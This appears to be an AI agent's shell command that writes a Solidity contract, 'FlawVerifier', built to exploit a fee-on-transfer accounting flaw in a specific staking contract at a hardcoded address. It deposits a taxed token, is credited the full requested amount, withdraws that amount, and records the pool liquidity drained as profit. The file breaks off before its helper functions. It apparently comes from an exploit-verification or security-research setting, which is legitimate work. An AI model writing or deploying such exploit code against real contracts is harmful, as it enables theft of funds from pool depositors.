/bin/bash -lc "cat > FlawVerifier.sol <<'SOL'
// SPDX-License-Identifier: MIT
pragma solidity "'^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IStaking {
    function deposit(address tokenAddress, uint256 amount, address referrer) external;
    function withdraw(address tokenAddress, uint256 amount) external;
    function balanceOf(address user, address token) external view returns (uint256);
}

contract FlawVerifier {
    address public constant TARGET = 0x245a551ee0F55005e510B239c917fA34b41B3461;

    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant WBTC_SWAPP_LP = 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce;

    string public constant EXPLOIT_PATH_USED =
        "Use a non-stable token that transfers only amount - fee to the staking contract -> call deposit(token, amount, referrer) so the contract credits the full requested amount instead of the net received amount -> later withdraw the full recorded balance, draining pre-existing pool liquidity.";

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public profitAchieved;

    string public failureReason;

    address public lastAttemptedToken;
    uint256 public lastObservedPoolBalance;
    uint256 public lastRequestedDeposit;
    uint256 public lastNetReceivedByStaking;
    uint256 public lastRecordedStake;
    uint256 public lastWithdrawNet;
    uint256 public lastPoolSpendOnWithdraw;
    uint256 public lastLeftoverAfterRepay;

    uint256 public lastAttackerBalanceBefore;
    uint256 public lastAttackerBalanceAfterDeposit;
    uint256 public lastAttackerBalanceAfterWithdraw;
    uint256 public lastPoolBalanceAfterDeposit;
    uint256 public lastPoolBalanceAfterWithdraw;
    uint256 public lastRecordedStakeBefore;
    uint256 public lastRecordedStakeAfterDeposit;

    constructor() {}

    function execute() external {
        _run();
    }

    function run() external {
        _run();
    }

    function verify() external {
        _run();
    }

    function exploit() external {
        _run();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function attempt(address token) external {
        require(msg.sender == address(this), "self only");
        _attempt(token);
    }

    function _run() internal {
        require(!executed, "already executed");
        executed = true;

        for (uint256 i = 0; i < _candidateCount(); ++i) {
            address token = _candidate(i);
            if (_isStable(token)) {
                continue;
            }

            lastAttemptedToken = token;

            try this.attempt(token) {
                if (profitAchieved) {
                    return;
                }
            } catch Error(string memory reason) {
                failureReason = reason;
            } catch {
                failureReason = "candidate deposit/withdraw attempt reverted";
            }
        }

        if (!hypothesisValidated) {
            hypothesisRefuted = true;
            _profitToken = address(0);
            _profitAmount = 0;
            profitAchieved = false;
            if (bytes(failureReason).length == 0) {
                failureReason =
                    "no candidate non-stable token both existed in the staking pool and already sat in this verifier with a taxed/deflationary transfer shortfall at this fork";
            }
            return;
        }

        if (!profitAchieved && bytes(failureReason).length == 0) {
            failureReason =
                "over-credit was observed, but the withdrawal did not spend more pool tokens than the deposit actually transferred in";
        }
    }

    function _attempt(address token) internal {
        (bool attackerOk, uint256 attackerBalanceBefore) = _tryBalanceOf(token, address(this));
        require(attackerOk, "attacker balanceOf failed");
        require(attackerBalanceBefore > 0, "verifier holds no candidate token");

        (bool poolOk, uint256 poolBalanceBefore) = _tryBalanceOf(token, TARGET);
        require(poolOk, "pool balanceOf failed");
        require(poolBalanceBefore > 0, "empty staking pool");

        uint256 depositAmount = _selectDepositAmount(attackerBalanceBefore, poolBalanceBefore);
        require(depositAmount > 0, "deposit amount is zero");

        uint256 recordedStakeBefore = IStaking(TARGET).balanceOf(address(this), token);

        lastObservedPoolBalance = poolBalanceBefore;
        lastRequestedDeposit = depositAmount;
        lastAttackerBalanceBefore = attackerBalanceBefore;
        lastRecordedStakeBefore = recordedStakeBefore;

        _forceApprove(token, TARGET, depositAmount);
        IStaking(TARGET).deposit(token, depositAmount, address(0));

        uint256 attackerBalanceAfterDeposit = _balanceOf(token, address(this));
        uint256 poolBalanceAfterDeposit = _balanceOf(token, TARGET);
        uint256 recordedStakeAfterDeposit = IStaking(TARGET).balanceOf(address(this), token);

        require(poolBalanceAfterDeposit >= poolBalanceBefore, "pool balance observation underflow");
        require(recordedStakeAfterDeposit >= recordedStakeBefore, "recorded stake observation underflow");

        uint256 netReceivedByStaking = poolBalanceAfterDeposit - poolBalanceBefore;
        uint256 recordedStakeDelta = recordedStakeAfterDeposit - recordedStakeBefore;

        lastAttackerBalanceAfterDeposit = attackerBalanceAfterDeposit;
        lastPoolBalanceAfterDeposit = poolBalanceAfterDeposit;
        lastNetReceivedByStaking = netReceivedByStaking;
        lastRecordedStakeAfterDeposit = recordedStakeAfterDeposit;
        lastRecordedStake = recordedStakeDelta;

        require(recordedStakeDelta >= depositAmount, "staking did not credit the requested amount");
        require(netReceivedByStaking < depositAmount, "deposit received the full requested amount");

        hypothesisValidated = true;

        IStaking(TARGET).withdraw(token, recordedStakeDelta);

        uint256 attackerBalanceAfterWithdraw = _balanceOf(token, address(this));
        uint256 poolBalanceAfterWithdraw = _balanceOf(token, TARGET);

        require(poolBalanceAfterDeposit >= poolBalanceAfterWithdraw, "withdraw increased pool balance");

        uint256 poolSpendOnWithdraw = poolBalanceAfterDeposit - poolBalanceAfterWithdraw;
        uint256 withdrawNet = attackerBalanceAfterWithdraw >= attackerBalanceAfterDeposit
            ? attackerBalanceAfterWithdraw - attackerBalanceAfterDeposit
            : 0;
        uint256 drainedFromPool = poolSpendOnWithdraw > netReceivedByStaking
            ? poolSpendOnWithdraw - netReceivedByStaking
            : 0;

        lastAttackerBalanceAfterWithdraw = attackerBalanceAfterWithdraw;
        lastPoolBalanceAfterWithdraw = poolBalanceAfterWithdraw;
        lastWithdrawNet = withdrawNet;
        lastPoolSpendOnWithdraw = poolSpendOnWithdraw;
        lastLeftoverAfterRepay = attackerBalanceAfterWithdraw;

        require(drainedFromPool > 0, "withdraw did not consume pre-existing pool liquidity");

        profitAchieved = true;
        _profitToken = token;
        _profitAmount = drainedFromPool;
        failureReason = "";
    }

